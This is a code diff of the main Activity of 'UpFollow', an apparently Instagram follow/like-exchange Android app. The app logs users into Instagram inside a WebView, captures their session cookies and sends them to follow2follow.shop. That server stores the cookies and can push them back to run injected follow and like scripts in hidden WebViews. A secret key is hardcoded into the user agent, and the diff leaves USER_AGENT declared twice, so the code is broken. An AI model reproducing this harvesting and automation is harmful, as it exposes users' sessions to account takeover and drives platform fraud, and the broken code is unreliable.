@@ -15,7 +15,6 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
-import android.util.Log;
 import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.webkit.CookieManager;
@@ -29,35 +28,23 @@ import android.widget.FrameLayout;
 
 import org.json.JSONObject;
 
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
+
 import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 
 public class MainActivity extends Activity {
-
-    // ========================================================
-    // 1. APP SECURITY, VERSION & USER-AGENT (100% FIXED)
-    // ========================================================
-    private static final String APP_SECRET_KEY = "brohu2580";
-    private static final int APP_VERSION_CODE = 2; // Ise update ke waqt 3, 4 karte rehna
-    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 " + APP_SECRET_KEY + " UFV/" + APP_VERSION_CODE;
-
+private static final String APP_SECRET_KEY = "brohu2580";
+    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 " + APP_SECRET_KEY;
     private WebView mainWebView;
     private WebView workerWebView;
     private WebView searchWebView;
-    
     private String pendingSearchUser = null;
-    private String pendingPostsUser = null;
 
     private static final String HOSTING_BASE = "https://follow2follow.shop/";
     private static final String HOSTING_DASHBOARD = HOSTING_BASE + "index.php";
     private static final String IG_URL = "https://www.instagram.com";
     private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
+    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36";
 
     private static final String CHANNEL_ID = "upfollow_automation_channel";
     private static final int NOTIFICATION_ID = 1001;
@@ -78,6 +65,7 @@ public class MainActivity extends Activity {
     private boolean addMode = false;
     private String captureNonce = "";
     private String captureCookies = "";
+
 
     private final Runnable taskTimeout = new Runnable() {
         @Override
@@ -131,7 +119,6 @@ public class MainActivity extends Activity {
         if (rootView != null) {
             rootView.addView(searchWebView, 0);
         }
-        
         searchWebView.addJavascriptInterface(new SearchBridge(), "SearchBridge");
         searchWebView.setWebViewClient(new WebViewClient() {
             @Override
@@ -233,8 +220,8 @@ public class MainActivity extends Activity {
             }
         });
 
-        // App start: Dashboard (Version code appended for update check)
-        mainWebView.loadUrl(HOSTING_DASHBOARD + "?v=" + APP_VERSION_CODE + "&dk=" + deviceKey);
+        // App start: hamesha dashboard (server decide karta hai: dashboard / saved accounts / login)
+        mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
     }
 
     private void setupWebView(WebView wv) {
@@ -250,7 +237,7 @@ public class MainActivity extends Activity {
     }
 
     // ------------------------------------------------------------------
-    // Device key
+    // Device key (reinstall ke baad saved accounts pehchanne ke liye)
     // ------------------------------------------------------------------
     private String computeDeviceKey() {
         try {
@@ -266,6 +253,9 @@ public class MainActivity extends Activity {
         }
     }
 
+    // ------------------------------------------------------------------
+    // Navigation: "Add Account" link ko yaha pakadte hain
+    // ------------------------------------------------------------------
     private boolean handleNav(final String url) {
         if (url != null && url.contains("force_authentication=1")) {
             uiHandler.post(new Runnable() {
@@ -273,6 +263,8 @@ public class MainActivity extends Activity {
                 public void run() {
                     addMode = true;
                     captureBusy = false;
+                    // Saare accounts ki cookies server par saved hain, isliye jar saaf karna safe hai.
+                    // Isse Instagram naya login form dikhata hai aur purana session nahi ghusta.
                     applyInstagramCookies("");
                     mainWebView.loadUrl(IG_LOGIN_URL);
                 }
@@ -282,6 +274,9 @@ public class MainActivity extends Activity {
         return false;
     }
 
+    // ------------------------------------------------------------------
+    // Instagram login capture (main WebView)
+    // ------------------------------------------------------------------
     private void checkInstagramLogin(String url) {
         if (url == null || captureBusy) return;
         if (!url.startsWith(IG_URL)) return;
@@ -317,6 +312,7 @@ public class MainActivity extends Activity {
             return;
         }
 
+        // Agar username fetch atak jaye to bina username ke aage badho
         uiHandler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -341,10 +337,13 @@ public class MainActivity extends Activity {
             mainWebView.postUrl(HOSTING_DASHBOARD, body.getBytes("UTF-8"));
         } catch (Exception e) {
             addMode = false;
-            mainWebView.loadUrl(HOSTING_DASHBOARD + "?v=" + APP_VERSION_CODE + "&dk=" + deviceKey);
+            mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
         }
     }
 
+    // ------------------------------------------------------------------
+    // Cookie helpers
+    // ------------------------------------------------------------------
     private static String cookieValue(String cookies, String name) {
         if (cookies == null) return "";
         for (String part : cookies.split(";")) {
@@ -357,6 +356,7 @@ public class MainActivity extends Activity {
         return "";
     }
 
+    // cookieStr khali ho to sirf Instagram cookies clear hoti hain
     private void applyInstagramCookies(String cookieStr) {
         CookieManager cm = CookieManager.getInstance();
         String existing = cm.getCookie(IG_URL);
@@ -389,6 +389,9 @@ public class MainActivity extends Activity {
         return u != null && u.startsWith(HOSTING_BASE);
     }
 
+    // ------------------------------------------------------------------
+    // Result delivery (ek task = ek result)
+    // ------------------------------------------------------------------
     private void deliverResult(boolean success, String message) {
         if (!taskActive) return;
         taskActive = false;
@@ -404,6 +407,9 @@ public class MainActivity extends Activity {
         return sb.toString();
     }
 
+    // ------------------------------------------------------------------
+    // Shared JS helpers (fatal state detection, popups)
+    // ------------------------------------------------------------------
     private static final String JS_HEAD = js(
         "(function() {",
         "  if (window.__ufRunning) return;",
@@ -441,6 +447,9 @@ public class MainActivity extends Activity {
         "  }"
     );
 
+    // ------------------------------------------------------------------
+    // FOLLOW SCRIPT
+    // ------------------------------------------------------------------
     private void injectFollowScript(WebView view) {
         String script = JS_HEAD + js(
             "  var FOLLOW = ['follow', 'follow back', '\u092b\u0949\u0932\u094b \u0915\u0930\u0947\u0902'];",
@@ -475,6 +484,9 @@ public class MainActivity extends Activity {
         view.evaluateJavascript(script, null);
     }
 
+    // ------------------------------------------------------------------
+    // LIKE SCRIPT: pehle DOM button, na mile to Instagram web API (fallback)
+    // ------------------------------------------------------------------
     private void injectLikeScript(WebView view) {
         String script = JS_HEAD + js(
             "  var LIKE = ['like', '\u092a\u0938\u0902\u0926 \u0915\u0930\u0947\u0902', 'me gusta', 'curtir', 'mi piace', 'suka', 'gef\u00e4llt mir'];",
@@ -550,229 +562,11 @@ public class MainActivity extends Activity {
         view.evaluateJavascript(script, null);
     }
 
-    private void createNotificationChannel() {
-        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "Automation Service", NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Shows live automation stats in status bar");
-            channel.setShowBadge(false);
-            if (notificationManager != null) {
-                notificationManager.createNotificationChannel(channel);
-            }
-        }
-    }
-
-    private void showOrUpdateNotification(int accounts, int tasks, int coins) {
-        if (notificationManager == null) return;
-        Notification.Builder builder;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            builder = new Notification.Builder(this, CHANNEL_ID);
-        } else {
-            builder = new Notification.Builder(this);
-        }
-        builder.setContentTitle("UpFollow Running")
-               .setContentText("Accounts: " + accounts + " Active  |  Tasks: " + tasks + "  |  Coins: +" + coins)
-               .setSmallIcon(android.R.drawable.stat_notify_sync)
-               .setOngoing(true);
-        notificationManager.notify(NOTIFICATION_ID, builder.build());
-    }
-
-    private void clearAutomationNotification() {
-        if (notificationManager != null) {
-            notificationManager.cancel(NOTIFICATION_ID);
-        }
-    }
-
-    public class MainAppInterface {
-
-        @JavascriptInterface
-        public void runTask(final String target, final String taskType, final String mediaId, final String cookieStr) {
-            if (!trusted()) return;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    currentTaskType = taskType;
-                    taskActive = true;
-                    uiHandler.removeCallbacks(taskTimeout);
-                    uiHandler.postDelayed(taskTimeout, TASK_TIMEOUT_MS);
-
-                    if (cookieStr != null && !cookieStr.isEmpty()) {
-                        applyInstagramCookies(cookieStr);
-                    }
-
-                    String cleanTarget = target == null ? "" : target.replaceAll("[^A-Za-z0-9._]", "");
-                    String url;
-                    if ("like".equalsIgnoreCase(taskType)) {
-                        if (mediaId != null && mediaId.startsWith("https://www.instagram.com/")) {
-                            url = mediaId;
-                        } else if (mediaId != null && !mediaId.isEmpty() && mediaId.matches("[A-Za-z0-9_-]+") && !mediaId.equals("25025320")) {
-                            url = (mediaId.length() <= 12 ? "https://www.instagram.com/reel/" : "https://www.instagram.com/p/") + mediaId + "/";
-                        } else {
-                            url = "https://www.instagram.com/" + cleanTarget + "/";
-                        }
-                    } else {
-                        url = "https://www.instagram.com/" + cleanTarget + "/";
-                    }
-                    workerWebView.loadUrl(url);
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void executeBrowserAction(String target, String taskType, String mediaId) {
-            runTask(target, taskType, mediaId, "");
-        }
-
-        @JavascriptInterface
-        public void executeBrowserFollow(String target) {
-            runTask(target, "follow", "", "");
-        }
-
-        @JavascriptInterface
-        public void fetchInstagramPostsLive(final String queryUsername) {
-            if (!trusted()) return;
-            final String u = queryUsername == null ? "" : queryUsername.replace("@", "").replaceAll("[^A-Za-z0-9._]", "");
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    if (u.isEmpty()) {
-                        pendingPostsUser = "_";
-                        deliverPosts("{\"success\":false,\"message\":\"Invalid username\"}");
-                    } else {
-                        startPosts(u);
-                    }
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void applySession(final String cookieStr) {
-            if (!trusted() || cookieStr == null || cookieStr.isEmpty()) return;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    applyInstagramCookies(cookieStr);
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void searchInstagramProfileLive(final String queryUsername) {
-            if (!trusted()) return;
-            final String u = queryUsername == null ? "" : queryUsername.replace("@", "").replaceAll("[^A-Za-z0-9._]", "");
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    if (u.isEmpty()) {
-                        pendingSearchUser = "_";
-                        deliverSearch("{\"success\":false,\"message\":\"Invalid username\"}");
-                    } else {
-                        startSearch(u);
-                    }
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public String getIgCookies() {
-            if (!trusted()) return "";
-            String c = CookieManager.getInstance().getCookie(IG_URL);
-            return c == null ? "" : c;
-        }
-
-        @JavascriptInterface
-        public void setKeepScreenOn(final boolean keepOn) {
-            if (!trusted()) return;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    if (keepOn) {
-                        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-                        if (wakeLock != null && !wakeLock.isHeld()) {
-                            wakeLock.acquire(12 * 60 * 60 * 1000L);
-                        }
-                    } else {
-                        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
-                        if (wakeLock != null && wakeLock.isHeld()) {
-                            wakeLock.release();
-                        }
-                    }
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void updateNotification(final int accounts, final int tasks, final int coins) {
-            if (!trusted()) return;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    showOrUpdateNotification(accounts, tasks, coins);
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void stopNotification() {
-            if (!trusted()) return;
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    clearAutomationNotification();
-                }
-            });
-        }
-    }
-
-    public class IgProbeInterface {
-        @JavascriptInterface
-        public void onIgInfo(final String nonce, final String username) {
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    if (captureBusy && nonce != null && nonce.equals(captureNonce)) {
-                        finishCapture(username);
-                    }
-                }
-            });
-        }
-    }
-
-    public class WorkerAppInterface {
-        @JavascriptInterface
-        public void onTaskResult(final boolean success, final String message) {
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    deliverResult(success, message);
-                }
-            });
-        }
-    }
-
-    public class SearchBridge {
-        @JavascriptInterface
-        public void onResult(final String json) {
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    deliverSearch(json);
-                }
-            });
-        }
-
-        @JavascriptInterface
-        public void onPosts(final String json) {
-            uiHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    deliverPosts(json);
-                }
-            });
-        }
-    }
-
+    // ------------------------------------------------------------------
+    // LIVE PROFILE SEARCH (followers.php target search)
+    // Alag hidden WebView use hota hai, taaki running task disturb na ho.
+    // Pehle Instagram API, fail ho to profile page ke meta tags se data nikalta hai.
+    // ------------------------------------------------------------------
     private boolean searchRunning = false;
 
     private final Runnable searchTimeout = new Runnable() {
@@ -833,6 +627,7 @@ public class MainActivity extends Activity {
             "    out({ success: true, username: r.username || U, full_name: r.full_name || '', numeric_id: '' + (r.pk || ''),",
             "          follower_count: r.fc, followers_formatted: fmt(r.fc) + ' followers', is_verified: !!r.verified, profile_pic: r.pic || '' });",
             "  }",
+            // ---- Strategy 1: web_profile_info API (kisi bhi 2xx status ko accept karta hai) ----
             "  function tryApi() {",
             "    return fetch('/api/v1/users/web_profile_info/?username=' + encodeURIComponent(U), { credentials: 'include', headers: H })",
             "    .then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
@@ -849,6 +644,7 @@ public class MainActivity extends Activity {
             "      return null;",
             "    }).catch(function() { return null; });",
             "  }",
+            // ---- Strategy 2: profile page ke meta tags (og:description me followers) ----
             "  function tryHtml() {",
             "    return fetch('/' + encodeURIComponent(U) + '/', { credentials: 'include', headers: { 'Accept': 'text/html' } })",
             "    .then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
@@ -895,6 +691,10 @@ public class MainActivity extends Activity {
         );
     }
 
+    // ------------------------------------------------------------------
+    // TARGET ACCOUNT KE POSTS + REELS (likes page ke liye)
+    // ------------------------------------------------------------------
+    private String pendingPostsUser = null;
     private boolean postsRunning = false;
 
     private final Runnable postsTimeout = new Runnable() {
@@ -1116,6 +916,242 @@ public class MainActivity extends Activity {
         );
     }
 
+    // Search WebView se result lene ke liye
+    public class SearchBridge {
+        @JavascriptInterface
+        public void onResult(final String json) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    deliverSearch(json);
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public void onPosts(final String json) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    deliverPosts(json);
+                }
+            });
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // Notification
+    // ------------------------------------------------------------------
+    private void createNotificationChannel() {
+        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID, "Automation Service", NotificationManager.IMPORTANCE_LOW);
+            channel.setDescription("Shows live automation stats in status bar");
+            channel.setShowBadge(false);
+            if (notificationManager != null) {
+                notificationManager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private void showOrUpdateNotification(int accounts, int tasks, int coins) {
+        if (notificationManager == null) return;
+        Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder = new Notification.Builder(this, CHANNEL_ID);
+        } else {
+            builder = new Notification.Builder(this);
+        }
+        builder.setContentTitle("UpFollow Running")
+               .setContentText("Accounts: " + accounts + " Active  |  Tasks: " + tasks + "  |  Coins: +" + coins)
+               .setSmallIcon(android.R.drawable.stat_notify_sync)
+               .setOngoing(true);
+        notificationManager.notify(NOTIFICATION_ID, builder.build());
+    }
+
+    private void clearAutomationNotification() {
+        if (notificationManager != null) {
+            notificationManager.cancel(NOTIFICATION_ID);
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // Bridges
+    // ------------------------------------------------------------------
+    public class MainAppInterface {
+
+        // Naya: account ki cookies ke saath task chalao (har account apna session use karta hai)
+        @JavascriptInterface
+        public void runTask(final String target, final String taskType, final String mediaId, final String cookieStr) {
+            if (!trusted()) return;
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    currentTaskType = taskType;
+                    taskActive = true;
+                    uiHandler.removeCallbacks(taskTimeout);
+                    uiHandler.postDelayed(taskTimeout, TASK_TIMEOUT_MS);
+
+                    if (cookieStr != null && !cookieStr.isEmpty()) {
+                        applyInstagramCookies(cookieStr);
+                    }
+
+                    String cleanTarget = target == null ? "" : target.replaceAll("[^A-Za-z0-9._]", "");
+                    String url;
+                    if ("like".equalsIgnoreCase(taskType)) {
+                        if (mediaId != null && mediaId.startsWith("https://www.instagram.com/")) {
+                            url = mediaId;
+                        } else if (mediaId != null && !mediaId.isEmpty() && mediaId.matches("[A-Za-z0-9_-]+") && !mediaId.equals("25025320")) {
+                            url = (mediaId.length() <= 12 ? "https://www.instagram.com/reel/" : "https://www.instagram.com/p/") + mediaId + "/";
+                        } else {
+                            url = "https://www.instagram.com/" + cleanTarget + "/";
+                        }
+                    } else {
+                        url = "https://www.instagram.com/" + cleanTarget + "/";
+                    }
+                    workerWebView.loadUrl(url);
+                }
+            });
+        }
+
+        // Purana method (compatibility)
+        @JavascriptInterface
+        public void executeBrowserAction(String target, String taskType, String mediaId) {
+            runTask(target, taskType, mediaId, "");
+        }
+
+        @JavascriptInterface
+        public void executeBrowserFollow(String target) {
+            runTask(target, "follow", "", "");
+        }
+
+        // Primary account ki cookie server par sync karne ke liye
+        // Likes page: target account ke posts + reels (thumbnail, likes, code)
+        @JavascriptInterface
+        public void fetchInstagramPostsLive(final String queryUsername) {
+            if (!trusted()) return;
+            final String u = queryUsername == null ? "" : queryUsername.replace("@", "").replaceAll("[^A-Za-z0-9._]", "");
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (u.isEmpty()) {
+                        pendingPostsUser = "_";
+                        deliverPosts("{\"success\":false,\"message\":\"Invalid username\"}");
+                    } else {
+                        startPosts(u);
+                    }
+                }
+            });
+        }
+
+        // Jar me koi Instagram session na ho to dashboard primary ka session laga deta hai
+        @JavascriptInterface
+        public void applySession(final String cookieStr) {
+            if (!trusted() || cookieStr == null || cookieStr.isEmpty()) return;
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    applyInstagramCookies(cookieStr);
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public void searchInstagramProfileLive(final String queryUsername) {
+            if (!trusted()) return;
+            final String u = queryUsername == null ? "" : queryUsername.replace("@", "").replaceAll("[^A-Za-z0-9._]", "");
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (u.isEmpty()) {
+                        pendingSearchUser = "_";
+                        deliverSearch("{\"success\":false,\"message\":\"Invalid username\"}");
+                    } else {
+                        startSearch(u);
+                    }
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public String getIgCookies() {
+            if (!trusted()) return "";
+            String c = CookieManager.getInstance().getCookie(IG_URL);
+            return c == null ? "" : c;
+        }
+
+        @JavascriptInterface
+        public void setKeepScreenOn(final boolean keepOn) {
+            if (!trusted()) return;
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (keepOn) {
+                        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                        if (wakeLock != null && !wakeLock.isHeld()) {
+                            wakeLock.acquire(12 * 60 * 60 * 1000L);
+                        }
+                    } else {
+                        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                        if (wakeLock != null && wakeLock.isHeld()) {
+                            wakeLock.release();
+                        }
+                    }
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public void updateNotification(final int accounts, final int tasks, final int coins) {
+            if (!trusted()) return;
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    showOrUpdateNotification(accounts, tasks, coins);
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public void stopNotification() {
+            if (!trusted()) return;
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    clearAutomationNotification();
+                }
+            });
+        }
+    }
+
+    // Instagram page se sirf username lene ke liye (nonce ke bina kaam nahi karta)
+    public class IgProbeInterface {
+        @JavascriptInterface
+        public void onIgInfo(final String nonce, final String username) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    if (captureBusy && nonce != null && nonce.equals(captureNonce)) {
+                        finishCapture(username);
+                    }
+                }
+            });
+        }
+    }
+
+    public class WorkerAppInterface {
+        @JavascriptInterface
+        public void onTaskResult(final boolean success, final String message) {
+            uiHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    deliverResult(success, message);
+                }
+            });
+        }
+    }
+
     @Override
     public void onBackPressed() {
         if (mainWebView.canGoBack()) {
@@ -1133,4 +1169,4 @@ public class MainActivity extends Activity {
         }
         super.onDestroy();
     }
-    }
+}
